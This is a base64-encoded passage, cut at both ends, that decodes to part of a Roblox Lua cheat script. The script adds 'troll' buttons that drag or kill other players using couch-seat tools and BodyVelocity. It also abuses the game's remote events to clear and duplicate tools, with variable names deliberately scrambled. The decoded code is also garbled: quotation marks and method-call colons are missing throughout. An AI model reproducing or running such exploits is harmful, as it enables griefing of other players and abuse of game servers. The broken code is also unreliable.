ciBtPTEsZXdvaWZqd29pZmppd28gZG8KICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjay5Db3VjaC5OYW1lID0gY291Y2guLm0KZW5kCndhaXQoKQpmb3Igd2VvZmVmYXdkLGl3aWVqZ3Vpd2cgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIGl3aWVqZ3Vpd2cuTmFtZSA9PSBjb3VjaC4ud2VvZmVmYXdkIHRoZW4KICAgICAgICBpd2llamd1aXdnLkhhbmRsZS5OYW1lID0gSGFuZGxlIAogICAgZW5kCmVuZAp3YWl0KDAuMikKbG9jYWwgZnVuY3Rpb24gYnJpbmcoc2tqZGZ1d2lydXdnLHdvaWVqZXdnKQogICAgaWYgd29pZWpld2cgPT0gbmlsID09IGZhbHNlIHRoZW4KICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbY291Y2guLnNramRmdXdpcnV3Z11GaW5kRmlyc3RDaGlsZChTZWF0MSkuRGlzYWJsZWQgPSB0cnVlCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW2NvdWNoLi5za2pkZnV3aXJ1d2ddRmluZEZpcnN0Q2hpbGQoU2VhdDIpLkRpc2FibGVkID0gdHJ1ZQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1tjb3VjaC4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgdGV0ID0gSW5zdGFuY2UubmV3KEJvZHlWZWxvY2l0eSwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlcltjb3VjaC4uc2tqZGZ1d2lydXdnXUZpbmRGaXJzdENoaWxkKEhhbmRsZSApKQogICAgICAgIHRldC5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSxtYXRoLmh1Z2UsbWF0aC5odWdlKQogICAgICAgIHRldC5QID0gMTI1MAogICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKQogICAgICAgIHRldC5OYW1lID0gI21PVk9PRVBGJCNARiQjR0VSRS4uVkVXVlcKICAgICAgICByZXBlYXQKICAgICAgICAgICAgZm9yIG09MSwzNSBkbwogICAgICAgICAgICAgICAgbG9jYWwgcG9zID0ge3g9MCwgeT0wLCB6PTB9CiAgICAgICAgICAgICAgICBwb3MueCA9IHdvaWVqZXdnLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLlgKICAgICAgICAgICAgICAgIHBvcy55ID0gd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWQogICAgICAgICAgICAgICAgcG9zLnogPSB3b2llamV3Zy5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbi5aCiAgICAgICAgICAgICAgICBwb3MueCA9IHBvcy54ICsgd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuVmVsb2NpdHkuWCAgMgogICAgICAgICAgICAgICAgcG9zLnkgPSBwb3MueSArIHdvaWVqZXdnLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5LlkgIDIKICAgICAgICAgICAgICAgIHBvcy56ID0gcG9zLnogKyB3b2llamV3Zy5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5WZWxvY2l0eS5aICAyCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW2NvdWNoLi5za2pkZnV3aXJ1d2ddRmluZEZpcnN0Q2hpbGQoU2VhdDEpLkNGcmFtZSA9IENGcmFtZS5uZXcoVmVjdG9yMy5uZXcocG9zLngscG9zLnkscG9zLnopKSAgQ0ZyYW1lLm5ldygtMiwyLDApCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlcltjb3VjaC4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1tjb3VjaC4uc2tqZGZ1d2lydXdnXUZpbmRGaXJzdENoaWxkKEhhbmRsZSApLk5hbWUgPSBIYW5kbGUKICAgICAgICAgICAgd2FpdCgwLjIpCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1tjb3VjaC4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW2NvdWNoLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbY291Y2guLnNramRmdXdpcnV3Z10uSGFuZGxlLk5hbWUgPSBIYW5kbGUgCiAgICAgICAgICAgIHdhaXQoMC4yKQogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbY291Y2guLnNramRmdXdpcnV3Z10uUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICB0ZXQgPSBJbnN0YW5jZS5uZXcoQm9keVZlbG9jaXR5LCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW2NvdWNoLi5za2pkZnV3aXJ1d2ddRmluZEZpcnN0Q2hpbGQoU2VhdDEpKQogICAgICAgICAgICB0ZXQuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsbWF0aC5odWdlLG1hdGguaHVnZSkKICAgICAgICAgICAgdGV0LlAgPSAxMjUwCiAgICAgICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKQogICAgICAgICAgICB0ZXQuTmFtZSA9ICNtT1ZPT0VQRiQjQEYkI0dFUkUuLlZFV1ZXCiAgICAgICAgdW50aWwgd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlCiAgICAgICAgd2FpdCgpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlcltjb3VjaC4uc2tqZGZ1d2lydXdnXUZpbmRGaXJzdENoaWxkKEhhbmRsZSApRmluZEZpcnN0Q2hpbGQoI21PVk9PRVBGJCNARiQjR0VSRS4uVkVXVlcpRGVzdHJveSgpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlcltjb3VjaC4uc2tqZGZ1d2lydXdnXS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICB3YWl0KCkKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbY291Y2guLnNramRmdXdpcnV3Z11GaW5kRmlyc3RDaGlsZChIYW5kbGUgKS5OYW1lID0gSGFuZGxlCiAgICAgICAgd2FpdCgwLjIpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW2NvdWNoLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICB3YWl0KCkKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW2NvdWNoLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgZW5kCmVuZApmb3IgbXdlZix3ZXVlcmcgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzR2V0UGxheWVycygpKSBkbwogICAgaWYgd2V1ZXJnLk5hbWUgPT0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLk5hbWUgPT0gZmFsc2UgdGhlbgogICAgICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgYnJpbmcobXdlZix3ZXVlcmcpCiAgICAgICAgZW5kKQogICAgZW5kCmVuZAogICAgZW5kCn0pCnByaW50KEJyaW5nIEFsbCBDb3VjaCBidXR0b24gY3JlYXRlZCkKClRyb2xsQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBLaWxsIEFsbCBDb3VjaCBbQmVzdF0sCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBhcmdzID0gewogICAgWzFdID0gQ2xlYXJBbGxUb29scwp9CgpnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSlXYWl0Rm9yQ2hpbGQoUkUpV2FpdEZvckNoaWxkKDFDbGVhMXJUb29sMXMpRmlyZVNlcnZlcih1bnBhY2soYXJncykpCgp3YWl0KDAuMikKCmxvY2FsIGluaXRpYWxQb3NpdGlvbiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbgoKbG9jYWwgcGFydCA9IEluc3RhbmNlLm5ldyhQYXJ0KQpwYXJ0LlNpemUgPSBWZWN0b3IzLm5ldyg1MDAwLCAxMCwgNTAwMCkKcGFydC5Qb3NpdGlvbiA9IFZlY3RvcjMubmV3KDAsIC01MDAsIDApCnBhcnQuQW5jaG9yZWQgPSB0cnVlCnBhcnQuQ2FuQ29sbGlkZSA9IHRydWUKcGFydC5QYXJlbnQgPSBnYW1lLldvcmtzcGFjZQp0YXNrLndhaXQoKQpnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygwLCAtNTAwLCAwKQp3YWl0KDIpCnRvb2xzZWxjdGVkID0gQ291Y2gKZHVwZWFtb3QgPSAyNSAtLSBkdXBlIGFtb3VudApwaWNrdG9vbHJlbW90ZSA9IGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFUb28xbCkKY2xlYXJ0b29scmVtb3RlID0gZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMUNsZWExclRvb2wxcykKZ2FtZUdldFNlcnZpY2UoU3RhcnRlckd1aSlTZXRDb3JlKFNlbmROb3RpZmljYXRpb24se1RpdGxlPUR1cGluZyxUZXh0PURvbid0IGNsaWNrIGFueXRoaW5nLCBCdXR0b24xID0gSSB1bmRlcnN0YW5kICxEdXJhdGlvbj01fSkKZ2FtZUdldFNlcnZpY2UoU3RhcnRlckd1aSlTZXRDb3JlKFNlbmROb3RpZmljYXRpb24se1RpdGxlPUR1cGluZyxUZXh0PVdhaXQsIEJ1dHRvbjEgPSBHb3QgaXQgLER1cmF0aW9uPTV9KQpkdXBpbmcgPSB0cnVlCm9sZGNmID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQppZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgIHRhc2sud2FpdCgpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9IGZhbHNlCmVuZAp3YWl0KDAuMSkKaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkKZW5kCmZvciBtPTEsMiBkbyAKICAgIHRhc2sud2FpdCgpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCmVuZAp0YXNrLndhaXQoMC4yKQpnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCndhaXQoMC41KQpmb3IgYWlkaixhZmggaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIGFmaC5OYW1lID09IHRvb2xzZWxjdGVkID09IGZhbHNlIHRoZW4KICAgICAgICBpZiBhZmhJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICBhZmguUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCmZvciBhaWVmaGlld2h3ZixkdmpidmogaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgaWYgZHZqYnZqSXNBKFRvb2wpIHRoZW4KICAgICAgICBpZiBkdmpidmouTmFtZSA9PSB0b29sc2VsY3RlZCA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgIGR2amJ2akRlc3Ryb3koKQogICAgICAgIGVuZAogICAgZW5kCmVuZApmb3IgdHRqdGp1dGp1dGpqdGosZGR2ZHZkc3ZkZmJybnl0eXRtdmR2IGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckdldENoaWxkcmVuKCkpIGRvCiAgICBpZiBkZHZkdmRzdmRmYnJueXR5dG12ZHZJc0EoVG9vbCkgdGhlbgogICAgICAgIGlmIGRkdmR2ZHN2ZGZicm55dHl0bXZkdi5OYW1lID09IHRvb2xzZWxjdGVkID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2RGVzdHJveSgpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCmZvciBmaW5kaW4sdG9vbGxlbCBpbiBwYWlycyhnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJHZXRDaGlsZHJlbigpKSBkbwogICAgaWYgdG9vbGxlbElzQShUb29sKSB0aGVuCiAgICAgICAgaWYgdG9vbGxlbC5OYW1lID09IHRvb2xzZWxjdGVkIHRoZW4KICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gdHJ1ZQogICAgICAgICAgICBmb3IgYmFzYyxhaWpmdyBpbiBwYWlycyh0b29sbGVsR2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgIGlmIGFpamZ3Lk5hbWUgPT0gSGFuZGxlIHRoZW4KICAgICAgICAgICAgICAgICAgICBhaWpmdy5OYW1lID0gSOIgpWHiIKVu4iClZOIgpWziIKVlCiAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICB0b2xsbGxhaGhoaCA9IHRvb2xsZWwKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVsc2UgCiAgICAgICAgICAgIHRvb2xsbGxmb3VuMiA9IGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCmZvciBmaWlmaSx0b29sbGxsIGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIHRvb2xsbGxJc0EoVG9vbCkgdGhlbgogICAgICAgIGlmIHRvb2xsbGwuTmFtZSA9PSB0b29sc2VsY3RlZCB0aGVuCiAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gdHJ1ZQogICAgICAgICAgICBmb3IgbmFuYSxqanNqc2ogaW4gcGFpcnModG9vbGxsbEdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBqanNqc2ouTmFtZSA9PSBIYW5kbGUgdGhlbgogICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgIGpqc2pzai5OYW1lID0gSOIgpWHiIKVu4iClZOIgpWziIKVlCiAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICB0b29sbGxmZmVsID0gdG9vbGxsbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVsc2UgCiAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgICAgICBlbmQKICAgIGVuZAplbmQKaWYgdG9vbGxsbGZvdW4gPT0gdHJ1ZSB0aGVuCiAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9vbGxsZmZlbCkgPT0gbmlsIHRoZW4gCiAgICAgICAgdG9vbGxsbGZvdW4gPSBmYWxzZSAKICAgIGVuZAogICAgcmVwZWF0IAogICAgICAgIHdhaXQoKSAKICAgIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sbGxmZmVsKSA9PSBuaWwKICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKZW5kCmlmIHRvb2xsbGxmb3VuMiA9PSB0cnVlIHRoZW4KICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsIHRoZW4gCiAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UgCiAgICBlbmQKICAgIHJlcGVhdCAKICAgICAgICB3YWl0KCkgCiAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbAogICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKZW5kCndhaXQoMC4xKQpmb3IgbT0xLCBkdXBlYW1vdCBkbwogICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgCiAgICAgICAgcmV0dXJuIAogICAgZW5kCiAgICBpZiBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKSB0aGVuCiAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkgCiAgICBlbmQKICAgIGlmIG0gPSBkdXBlYW1vdCB0aGVuCiAgICAgICAgZ2FtZUdldFNlcnZpY2UoU3RhcnRlckd1aSlTZXRDb3JlKFNlbmROb3RpZmljYXRpb24se1RpdGxlPUR1cGUgU2NyaXB0LFRleHQ9Tm93IHlvdSBoYXZlLi4gLi5tLi4gLi5EdXBlZC4uIC4udG9vbHNlbGN0ZWQuLiEsRHVyYXRpb249MC41fSkKICAgIGVsc2VpZiBtID09IGR1cGVhbW90IG9yIG0gPSBkdXBlYW1vdCAtIDEgdGhlbgogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFN0YXJ0ZXJHdWkpU2V0Q29yZShTZW5kTm90aWZpY2F0aW9uLHtUaXRsZT1EdXBlIFNjcmlwdCxUZXh0PU5vdyB5b3UgaGF2ZS4uIC4ubS4uIC4uRHVwZWQuLiAuLnRvb2xzZWxjdGVkLi4hLi4gLi5Ub29scyBhcmUgYmVpbmcgZHVwZWQsIGRvbid0IGNsaWNrIGFueXRoaW5nLixEdXJhdGlvbj00fSkKICAgIGVuZAogICAgbG9jYWwgYXJncyA9IHsKICAgICAgICBbMV0gPSBQaWNraW5nVG9vbHMsCiAgICAgICAgWzJdID0gdG9vbHNlbGN0ZWQKICAgIH0KCiAgICBwaWNrdG9vbHJlbW90ZUludm9rZVNlcnZlcih1bnBhY2soYXJncykpIAogICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tXYWl0Rm9yQ2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgCiAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbiAKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSAKICAgICAgICByZXR1cm4gCiAgICBlbmQgCiAgICB3YWl0KCkgCiAgICBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHNlbGN0ZWRdRmluZEZpcnN0Q2hpbGQoSGFuZGxlKS5OYW1lID0gSOIgpWHiIKVu4iClZOIgpWziIKVlIAogICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjayAKICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrRmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgCiAgICByZXBlYXQgCiAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbiAKICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkgCiAgICAgICAgZW5kIAogICAgICAgIHRhc2sud2FpdCgpIAogICAgdW50aWwgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpID09IG5pbCAKZW5kIApnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZSAKcmVwZWF0IAogICAgd2FpdCgpIAp1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgPT0gbmlsIApyZXBlYXQgCiAgICB3YWl0KCkgCnVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KSAKZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9sZGNmIAp3YWl0KCkgCmR1cGluZyA9IGZhbHNlIApmb3Igd3dlZmVmLHdlaWZ3d2UgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzR2V0UGxheWVycygpKSBkbyAKICAgIGlmIHdlaWZ3d2UuTmFtZSA9PSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZSA9PSBmYWxzZSB0aGVuIAogICAgICAgIGV3b2lmandvaWZqaXdvID0gd3dlZmVmIAogICAgZW5kIAplbmQgCmZvciBtPTEsZXdvaWZqd29pZmppd28gZG8gCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2suQ291Y2guTmFtZSA9IENoYW9zIENvdWNoLi5tIAplbmQgCndhaXQoKSAKZm9yIHdlb2ZlZmF3ZCxpd2llamd1aXdnIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja0dldENoaWxkcmVuKCkpIGRvIAogICAgaWYgaXdpZWpndWl3Zy5OYW1lID09IENoYW9zIENvdWNoLi53ZW9mZWZhd2QgdGhlbiAKICAgICAgICBpd2llamd1aXdnLkhhbmRsZS5OYW1lID0gSGFuZGxlICAKICAgIGVuZCAKZW5kIAp3YWl0KDAuMikgCmxvY2FsIGZ1bmN0aW9uIGJyaW5nKHNramRmdXdpcnV3Zyx3b2llamV3ZykgCiAgICBpZiB3b2llamV3ZyA9PSBuaWwgPT0gZmFsc2UgdGhlbiAKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbQ2hhb3MgQ291Y2guLnNramRmdXdpcnV3Z11GaW5kRmlyc3RDaGlsZChTZWF0MSkuRGlzYWJsZWQgPSB0cnVlIAogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1tDaGFvcyBDb3VjaC4uc2tqZGZ1d2lydXdnXUZpbmRGaXJzdENoaWxkKFNlYXQyKS5EaXNhYmxlZCA9IHRydWUgCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW0NoYW9zIENvdWNoLi5za2pkZnV3aXJ1d2ddLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIgCiAgICAgICAgdGV0ID0gSW5zdGFuY2UubmV3KEJvZHlWZWxvY2l0eSwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcltDaGFvcyBDb3VjaC4uc2tqZGZ1d2lydXdnXUZpbmRGaXJzdENoaWxkKEhhbmRsZSApKSAKICAgICAgICB0ZXQuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsbWF0aC5odWdlLG1hdGguaHVnZSkgCiAgICAgICAgdGV0LlAgPSAxMjUwIAogICAgICAgIHRldC5WZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKSAKICAgICAgICB0ZXQuTmFtZSA9ICNtT1ZPT0VQRiQjQEYkI0dFUkUuLlZFV1ZXIAogICAgICAgIHJlcGVhdCAKICAgICAgICAgICAgZm9yIG09MSwzNSBkbyAKICAgICAgICAgICAgICAgIGxvY2FsIHBvcyA9IHt4PTAsIHk9MCwgej0wfSAKICAgICAgICAgICAgICAgIHBvcy54ID0gd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWCAKICAgICAgICAgICAgICAgIHBvcy55ID0gd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWSAKICAgICAgICAgICAgICAgIHBvcy56ID0gd29pZWpld2cuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWiAKICAgICAgICAgICAgICAgIHBvcy54ID0gcG9zLnggKyB3b2llamV3Zy5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5WZWxvY2l0eS5YICAyIAogICAgICAgICAgICAgICAgcG9zLnkgPSBwb3M